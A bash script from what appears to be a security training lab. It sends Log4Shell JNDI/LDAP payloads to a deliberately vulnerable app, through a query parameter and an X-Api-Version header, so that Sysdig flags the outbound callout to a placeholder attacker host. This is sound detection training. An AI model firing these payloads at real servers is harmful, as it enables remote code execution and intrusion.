#!/usr/bin/env bash
# Module 7 / Test 7.1 — Log4Shell (CVE-2021-44228) against the vuln-app.
# Run on the bastion:  ./07-01-example-curls-log4shell.sh [LISTENER_HOST:PORT]
#
# The vuln-app logs the ?payload= value through Log4j2 2.14.1, which performs
# ${jndi:...} message lookups by default. The JVM then makes an outbound
# JNDI/LDAP (and DNS) callout to the listener — that callout is what Sysdig
# detects at runtime, whether or not a real LDAP server answers.
set -u

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30099
# Default is a non-routable placeholder so the DNS/connect attempt still fires
# (and Sysdig flags it). Pass your own LDAP referral host as $1 to go further.
LISTENER="${1:-attacker.example.com:1389}"
BASE="http://${NODE_IP}:${NODE_PORT}"

echo "[7.1] Log4Shell via query param -> ${BASE}/log4shell"
curl -s -G "${BASE}/log4shell" \
  --data-urlencode "payload=\${jndi:ldap://${LISTENER}/x}"
echo

echo "[7.1] Log4Shell via X-Api-Version header -> ${BASE}/log4shell"
curl -s "${BASE}/log4shell?payload=hdr" \
  -H "X-Api-Version: \${jndi:ldap://${LISTENER}/a}"
echo

echo "[7.1] done — look in Sysdig (Threats -> Kubernetes, vuln-app namespace)"
echo "      for the outbound JNDI/LDAP lookup + DNS resolution from the JVM."
